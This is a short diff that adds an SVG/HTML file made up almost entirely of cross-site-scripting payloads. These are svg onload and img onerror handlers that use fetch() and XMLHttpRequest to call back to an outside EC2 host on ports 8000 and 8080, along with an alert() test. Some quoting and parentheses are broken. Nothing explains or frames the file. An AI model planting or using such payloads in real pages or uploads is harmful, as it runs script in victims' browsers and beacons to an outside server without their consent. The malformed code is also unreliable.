@@ -1,0 +1,15 @@
+<svg onload="fetch('http://'ec2-54-82-200-213.compute-1.amazonaws.com:8000/some.svg')"
+onerror=""
+>
+<object data="ec2-54-82-200-213.compute-1.amazonaws.com:8000/some.svg" />
+
+</object>
+
+</svg>
+<img width="90" height="90">       
+     <image xlink:href="http://ec2-54-82-200-213.compute-1.amazonaws.com:8000" src="http://ec2-54-82-200-213.compute-1.amazonaws.com:8000" width="90" height="90" onerror="var oReq = new XMLHttpRequest();oReq.open('GET', 'http://ec2-54-82-200-213.compute-1.amazonaws.com:8080');oReq.send();;"/></svg>
+
+
+<img width="90" height="90" src="http://ec2-54-82-200-213.compute-1.amazonaws.com:8000" onerror="alert(); fetch('http://ec2-54-82-200-213.compute-1.amazonaws.com:8000'"/>       
+     
+
